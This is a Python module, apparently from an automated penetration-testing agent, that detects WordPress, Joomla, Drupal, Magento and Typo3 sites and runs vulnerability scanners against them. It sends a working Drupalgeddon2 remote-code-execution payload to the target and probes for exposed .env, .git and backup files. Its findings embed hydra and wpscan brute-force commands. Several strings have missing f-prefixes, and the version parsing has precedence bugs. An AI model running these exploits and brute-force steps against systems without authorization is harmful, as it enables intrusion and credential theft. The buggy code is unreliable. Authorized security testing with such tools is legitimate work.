"""
cms_subagent.py — CMS detection and vulnerability scanning.

AGENT_NAME  : "web"
SUBAGENT_NAME: "cms"

Supported CMS platforms:
  - WordPress  — wpscan (CVE DB, plugin vulns, user enum, XML-RPC)
  - Joomla     — joomscan (version, component vulns, config exposure)
  - Drupal     — droopescan (version fingerprinting, known CVEs)
  - Magento    — magescan (version, admin path, API keys)
  - Typo3      — droopescan (version, plugin vulns)
  - Generic    — whatweb (technology fingerprinting for any CMS)

Methodology:
  1. Detect CMS with whatweb / curl-based fingerprinting
  2. Run platform-specific scanner
  3. Parse: version, plugins, themes, usernames, vulnerabilities, misconfigs
  4. Findings: CRITICAL for auth bypass/RCE; HIGH for unpatched plugins/version;
              MEDIUM for user enumeration/info disclosure; LOW/INFO for fingerprinting
"""

from __future__ import annotations

import logging
import re
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

_WP_RE = re.compile(r"(WordPress|wp-content|wp-login|xmlrpc\.php|wp-json)", re.IGNORECASE)
_JOOMLA_RE = re.compile(r"(Joomla|/components/com_|joomla\.js|/templates/beez)", re.IGNORECASE)
_DRUPAL_RE = re.compile(r"(Drupal|sites/default|drupal\.js|/misc/drupal\.js)", re.IGNORECASE)
_MAGENTO_RE = re.compile(r"(Magento|Mage\.Cookies|mage/frontend|skin/frontend)", re.IGNORECASE)
_TYPO3_RE = re.compile(r"(TYPO3|typo3conf|typo3temp|fileadmin)", re.IGNORECASE)

_WP_VERSION_RE = re.compile(r"WordPress\s+([\d.]+)", re.IGNORECASE)
_WP_VULN_RE = re.compile(r"\[!\]\s*(.+?)\s*\|?\s*(CVE-[\d-]+)?", re.IGNORECASE)
_WP_USER_RE = re.compile(r"(Found Username|user_login|author=\d+.*login=).*?:\s*(\w+)", re.IGNORECASE)
_WP_PLUGIN_VULN_RE = re.compile(r"Plugin:\s*(\S+).*?VULNERABILITY", re.IGNORECASE | re.DOTALL)

_JOOM_VERSION_RE = re.compile(r"Joomla\s*([\d.]+)|version:\s*([\d.]+)", re.IGNORECASE)
_JOOM_VULN_RE = re.compile(r"(SQL Injection|XSS|LFI|RCE|Remote File Inclusion|Auth Bypass)", re.IGNORECASE)
_JOOM_CONFIG_RE = re.compile(r"(configuration\.php|/administrator/)", re.IGNORECASE)

_DRUPAL_VERSION_RE = re.compile(r"Drupal\s*([\d.]+)|\[+\]\s*Drupal\s*([\d.]+)", re.IGNORECASE)
_CVE_RE = re.compile(r"CVE-\d{4}-\d{4,7}", re.IGNORECASE)
_ADMIN_PATH_RE = re.compile(r"(admin|administrator|wp-admin|/user/login)", re.IGNORECASE)


class CmsSubagent(BaseSubagent):
    """Detect CMS and run platform-specific vulnerability scans."""

    AGENT_NAME: str = "web"
    SUBAGENT_NAME: str = "cms"

    async def run(self, target: str, wpscan_api_token: str = "", **kwargs: Any) -> SubagentResult:
        """
        Auto-detect CMS and scan for vulnerabilities.

        Parameters
        ----------
        target:
            Target URL (e.g. http://192.168.1.10 or https://cms.target.com).
        wpscan_api_token:
            WPScan API token for vulnerability database lookups (optional).

        Returns
        -------
        SubagentResult
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )

        # ── 1. CMS Detection ──────────────────────────────────────────────
        whatweb_output = await self.collect_tool(
            "whatweb",
            target,
            {"options": f"-a 3 --log-brief=/tmp/whatweb_{target.replace('/', '_').replace(':', '_')}.txt {target} 2>&1"},
        )

        homepage_output = await self.collect_tool(
            "curl",
            target,
            {"options": f"-sk --connect-timeout 10 --max-time 15 -L {target} 2>&1"},
        )

        all_text = whatweb_output + homepage_output

        # Determine CMS
        cms_detected = "unknown"
        if _WP_RE.search(all_text):
            cms_detected = "wordpress"
        elif _JOOMLA_RE.search(all_text):
            cms_detected = "joomla"
        elif _DRUPAL_RE.search(all_text):
            cms_detected = "drupal"
        elif _MAGENTO_RE.search(all_text):
            cms_detected = "magento"
        elif _TYPO3_RE.search(all_text):
            cms_detected = "typo3"

        await self.store_finding(Finding(
            title=f"CMS Detection: {cms_detected.title()} Identified at {target}",
            description=(
                f"CMS fingerprinting identified: {cms_detected.title()}. "
                f"Technology stack detected by whatweb and content inspection. "
                f"Proceeding with {cms_detected}-specific vulnerability scanning."
            ),
            severity="INFO",
            evidence=whatweb_output[:1000],
            tool="whatweb",
            host=target,
            mitre_technique="T1592",
        ))

        # ── 2. CMS-specific scanning ──────────────────────────────────────
        if cms_detected == "wordpress":
            await self._scan_wordpress(target, wpscan_api_token)
        elif cms_detected == "joomla":
            await self._scan_joomla(target)
        elif cms_detected in ("drupal", "typo3"):
            await self._scan_droopescan(target, cms_detected)
        elif cms_detected == "magento":
            await self._scan_magento(target)
        else:
            await self._generic_cms_scan(target, whatweb_output)

        result.findings = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result

    # ------------------------------------------------------------------
    # WordPress scanning
    # ------------------------------------------------------------------

    async def _scan_wordpress(self, target: str, api_token: str) -> None:
        """Run WPScan against a WordPress installation."""

        token_flag = f"--api-token {api_token}" if api_token else ""

        wpscan_output = await self.collect_tool(
            "wpscan",
            target,
            {"options": (
                f"--url {target} "
                f"--enumerate u,vp,vt,dbe "  # users, vulnerable plugins, vulnerable themes, db exports
                f"{token_flag} "
                f"--random-user-agent "
                f"--no-banner "
                f"--format cli-no-colour "
                f"2>&1"
            )},
        )

        # Version detection
        version_match = _WP_VERSION_RE.search(wpscan_output)
        wp_version = version_match.group(1) if version_match else "unknown"

        await self.store_finding(Finding(
            title=f"WordPress: Version {wp_version} Detected",
            description=(
                f"WordPress version {wp_version} identified. "
                f"{'Check https://wordpress.org/news/category/releases/ for known vulnerabilities.' if wp_version != 'unknown' else 'Version could not be determined — check manually.'}"
            ),
            severity="MEDIUM" if wp_version != "unknown" else "INFO",
            evidence=wpscan_output[:500],
            tool="wpscan",
            host=target,
            mitre_technique="T1592",
            exploit_suggestion=(
                f"Search WPScan DB: wpscan --url {target} --api-token <token>. "
                f"Check: https://wpscan.com/wordpresses/{wp_version.replace('.', '/')}"
            ),
        ))

        # User enumeration
        usernames = list(set(_WP_USER_RE.findall(wpscan_output)))
        if usernames:
            await self.store_finding(Finding(
                title=f"WordPress: {len(usernames)} Username(s) Enumerated",
                description=(
                    f"WPScan enumerated {len(usernames)} WordPress username(s). "
                    f"Users: {', '.join(str(u) for u in usernames[:10])}. "
                    "Usernames enable targeted brute-force attacks against wp-login.php or XML-RPC."
                ),
                severity="MEDIUM",
                evidence="\n".join(str(u) for u in usernames[:10]),
                tool="wpscan",
                host=target,
                mitre_technique="T1078.003",
                exploit_suggestion=(
                    f"Brute-force: wpscan --url {target} --usernames <user> "
                    f"--passwords /usr/share/wordlists/rockyou.txt. "
                    f"XML-RPC: python3 xmlrpc_bruteforce.py {target}/xmlrpc.php"
                ),
            ))

        # Vulnerable plugins
        vuln_matches = _WP_VULN_RE.findall(wpscan_output)
        cves_found = _CVE_RE.findall(wpscan_output)
        plugin_vulns = [l for l in wpscan_output.splitlines()
                        if re.search(r"\[!\]|VULNERABILITY|Vulnerability", l)]

        if plugin_vulns or cves_found:
            await self.store_finding(Finding(
                title=f"WordPress: {len(plugin_vulns)} Plugin/Theme Vulnerability/ies Detected",
                description=(
                    f"WPScan identified {len(plugin_vulns)} vulnerability/ies in installed plugins or themes. "
                    f"CVEs found: {', '.join(cves_found[:10]) or 'see evidence'}. "
                    "Vulnerable plugins are the leading cause of WordPress site compromise."
                ),
                severity="HIGH",
                evidence="\n".join(plugin_vulns[:20]),
                tool="wpscan",
                host=target,
                mitre_technique="T1190",
                exploit_suggestion=(
                    "Check exploit-db / Metasploit for each CVE. "
                    "Update all plugins immediately. "
                    "Disable unused plugins."
                ),
            ))

        # XML-RPC check
        xmlrpc_output = await self.collect_tool(
            "curl",
            target,
            {"options": (
                f"-sk --connect-timeout 10 -X POST {target}/xmlrpc.php "
                f"-d '<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName></methodCall>' 2>&1"
            )},
        )

        if "methodResponse" in xmlrpc_output or "system.listMethods" in xmlrpc_output:
            await self.store_finding(Finding(
                title="WordPress: XML-RPC Enabled — Brute-Force & DDoS Risk",
                description=(
                    "WordPress XML-RPC interface (xmlrpc.php) is enabled and responsive. "
                    "XML-RPC allows unlimited login attempts in a single request (multicall attack), "
                    "bypassing rate-limiting, and can be used for DDoS amplification via pingbacks."
                ),
                severity="MEDIUM",
                evidence=xmlrpc_output[:300],
                tool="curl",
                host=target,
                mitre_technique="T1110.003",
                exploit_suggestion=(
                    "Test multicall brute-force: python3 wpxmlrpc_bruteforce.py {target}. "
                    "Disable XML-RPC: add 'add_filter(\"xmlrpc_enabled\", \"__return_false\");' to functions.php."
                ),
            ))

    # ------------------------------------------------------------------
    # Joomla scanning
    # ------------------------------------------------------------------

    async def _scan_joomla(self, target: str) -> None:
        """Run JoomScan against Joomla installations."""

        joomscan_output = await self.collect_tool(
            "joomscan",
            target,
            {"options": f"--url {target} --enumerate-components 2>&1"},
        )

        version_match = _JOOM_VERSION_RE.search(joomscan_output)
        joomla_version = version_match.group(1) or version_match.group(2) if version_match else "unknown"

        await self.store_finding(Finding(
            title=f"Joomla: Version {joomla_version} Detected",
            description=(
                f"Joomla CMS version {joomla_version} identified. "
                "Check joomscan output for known vulnerabilities in this version."
            ),
            severity="MEDIUM",
            evidence=joomscan_output[:500],
            tool="joomscan",
            host=target,
            mitre_technique="T1592",
        ))

        # Check for vulnerabilities
        vuln_types = _JOOM_VULN_RE.findall(joomscan_output)
        cves = _CVE_RE.findall(joomscan_output)

        if vuln_types or cves:
            await self.store_finding(Finding(
                title=f"Joomla: Vulnerabilities Found — {', '.join(set(vuln_types[:5]))}",
                description=(
                    f"JoomScan identified vulnerability types: {', '.join(set(vuln_types))}. "
                    f"CVEs: {', '.join(cves[:10]) or 'none explicitly listed'}. "
                    "Joomla components are frequent targets for exploitation."
                ),
                severity="HIGH",
                evidence=joomscan_output[:2000],
                tool="joomscan",
                host=target,
                mitre_technique="T1190",
                exploit_suggestion=(
                    "Search Exploit-DB: searchsploit joomla <version>. "
                    "Check CVE details and exploit availability."
                ),
            ))

        # Admin panel exposure
        admin_output = await self.collect_tool(
            "curl",
            target,
            {"options": f"-sk --connect-timeout 10 -o /dev/null -w '%{{http_code}}' {target}/administrator/ 2>&1"},
        )

        if admin_output.strip() in ("200", "302", "301"):
            await self.store_finding(Finding(
                title="Joomla: Administrator Panel Exposed — Brute-Force Risk",
                description=(
                    f"Joomla administrator panel is accessible at {target}/administrator/. "
                    "HTTP status: {admin_output.strip()}. "
                    "Exposed admin panels are subject to brute-force and credential stuffing attacks."
                ),
                severity="MEDIUM",
                evidence=f"HTTP {admin_output.strip()} at {target}/administrator/",
                tool="curl",
                host=target,
                mitre_technique="T1110.001",
                exploit_suggestion=(
                    f"Brute-force: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt "
                    f"{target} http-post-form '/administrator/index.php:username=^USER^&passwd=^PASS^:Invalid'"
                ),
            ))

    # ------------------------------------------------------------------
    # Droopescan (Drupal / Typo3)
    # ------------------------------------------------------------------

    async def _scan_droopescan(self, target: str, cms: str) -> None:
        """Run Droopescan for Drupal or Typo3."""

        droope_output = await self.collect_tool(
            "droopescan",
            target,
            {"options": f"scan {cms} --url {target} 2>&1"},
        )

        version_match = _DRUPAL_VERSION_RE.search(droope_output)
        version = version_match.group(1) or version_match.group(2) if version_match else "unknown"

        cves = _CVE_RE.findall(droope_output)
        plugin_lines = [l for l in droope_output.splitlines()
                        if re.search(r"(plugin|module|extension)", l, re.IGNORECASE)]

        await self.store_finding(Finding(
            title=f"{cms.title()}: Version {version} — {len(cves)} CVE(s) Referenced",
            description=(
                f"{cms.title()} version {version} identified via Droopescan. "
                f"{len(cves)} CVE references found: {', '.join(cves[:5]) or 'none'}. "
                f"{len(plugin_lines)} plugin/module references enumerated."
            ),
            severity="HIGH" if cves else "MEDIUM",
            evidence=droope_output[:2000],
            tool="droopescan",
            host=target,
            mitre_technique="T1190",
            exploit_suggestion=(
                f"Check known {cms.title()} exploits: searchsploit {cms} {version}. "
                f"Drupalgeddon2 (CVE-2018-7600) and Drupalgeddon3 (CVE-2018-7602) are critical if applicable."
            ) if cms == "drupal" else None,
        ))

        # Drupal-specific: check for Drupalgeddon
        if cms == "drupal":
            dgeddon_output = await self.collect_tool(
                "curl",
                target,
                {"options": (
                    f"-sk --connect-timeout 10 "
                    f"-d 'form_id=user_register_form&_drupal_ajax=1&mail[#markup]=id&mail[#type]=markup' "
                    f"{target}/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup "
                    f"2>&1"
                )},
            )

            if re.search(r"uid=\d+|root|www-data", dgeddon_output):
                await self.store_finding(Finding(
                    title="Drupal: CRITICAL — Drupalgeddon RCE (CVE-2018-7600/7602) VULNERABLE",
                    description=(
                        "Remote Code Execution confirmed via Drupalgeddon2/3 exploit. "
                        "Command execution response detected in server output. "
                        "This is a critical unauthenticated RCE vulnerability."
                    ),
                    severity="CRITICAL",
                    evidence=dgeddon_output[:500],
                    tool="curl",
                    host=target,
                    cve="CVE-2018-7600",
                    mitre_technique="T1190",
                    exploit_suggestion=(
                        "Full exploit: drupa18-poc.py or use Metasploit: "
                        "use exploit/unix/webapp/drupal_drupalgeddon2"
                    ),
                ))

    # ------------------------------------------------------------------
    # Magento scanning
    # ------------------------------------------------------------------

    async def _scan_magento(self, target: str) -> None:
        """Scan Magento for version info and vulnerabilities."""

        magescan_output = await self.collect_tool(
            "magescan",
            target,
            {"options": f"scan:all {target} 2>&1"},
        )

        version_match = re.search(r"Magento\s*([\d.]+)", magescan_output, re.IGNORECASE)
        mag_version = version_match.group(1) if version_match else "unknown"
        cves = _CVE_RE.findall(magescan_output)

        await self.store_finding(Finding(
            title=f"Magento: Version {mag_version} — {len(cves)} CVE(s)",
            description=(
                f"Magento {mag_version} detected via magescan. "
                f"CVEs identified: {', '.join(cves[:5]) or 'none'}. "
                "Magento is frequently targeted for payment card skimming (Magecart)."
            ),
            severity="HIGH" if cves else "MEDIUM",
            evidence=magescan_output[:2000],
            tool="magescan",
            host=target,
            mitre_technique="T1190",
            exploit_suggestion=(
                "Check for Magento admin panel: {target}/admin, /index.php/admin. "
                "SQLi: search searchsploit magento {version}. "
                "Check for Magecart-style JS injection on payment pages."
            ),
        ))

    # ------------------------------------------------------------------
    # Generic fallback scan
    # ------------------------------------------------------------------

    async def _generic_cms_scan(self, target: str, whatweb_output: str) -> None:
        """Run generic web vulnerability checks when CMS cannot be identified."""

        # Common admin paths
        admin_paths = [
            "/admin", "/administrator", "/wp-admin", "/dashboard",
            "/login", "/panel", "/cms", "/backend",
        ]

        found_admin = []
        for path in admin_paths:
            check = await self.collect_tool(
                "curl",
                target,
                {"options": f"-sk --connect-timeout 5 -o /dev/null -w '%{{http_code}}' {target}{path} 2>&1"},
            )
            if check.strip() in ("200", "301", "302", "403"):
                found_admin.append(f"{path} -> HTTP {check.strip()}")

        if found_admin:
            await self.store_finding(Finding(
                title=f"CMS Generic: {len(found_admin)} Admin/Login Panel(s) Found",
                description=(
                    f"{len(found_admin)} administrative interface(s) discovered. "
                    f"Paths: {', '.join(found_admin)}. "
                    "Authentication panels are targets for brute-force and credential stuffing."
                ),
                severity="MEDIUM",
                evidence="\n".join(found_admin),
                tool="curl",
                host=target,
                mitre_technique="T1190",
                exploit_suggestion=(
                    "Attempt default credentials. "
                    "Run: hydra -L users.txt -P passwords.txt {target} http-get /admin"
                ),
            ))

        # Common sensitive files
        sensitive_paths = [
            "/.git/HEAD", "/.env", "/config.php", "/phpinfo.php",
            "/debug.php", "/test.php", "/backup.sql", "/.htaccess",
        ]

        for path in sensitive_paths:
            check = await self.collect_tool(
                "curl",
                target,
                {"options": f"-sk --connect-timeout 5 -o /dev/null -w '%{{http_code}}' {target}{path} 2>&1"},
            )
            if check.strip() == "200":
                content = await self.collect_tool(
                    "curl",
                    target,
                    {"options": f"-sk --connect-timeout 5 --max-time 10 {target}{path} 2>&1 | head -20"},
                )
                await self.store_finding(Finding(
                    title=f"CMS Generic: Sensitive File Exposed — {path}",
                    description=(
                        f"Sensitive file accessible at {target}{path} (HTTP 200). "
                        f"This file may expose source code, configuration, credentials, or version information."
                    ),
                    severity="HIGH" if any(s in path for s in [".env", "config.php", ".git", "backup.sql"]) else "MEDIUM",
                    evidence=content[:500],
                    tool="curl",
                    host=target,
                    mitre_technique="T1083",
                    exploit_suggestion=(
                        f"Retrieve and analyse {path} for credential material and configuration details."
                    ),
                ))
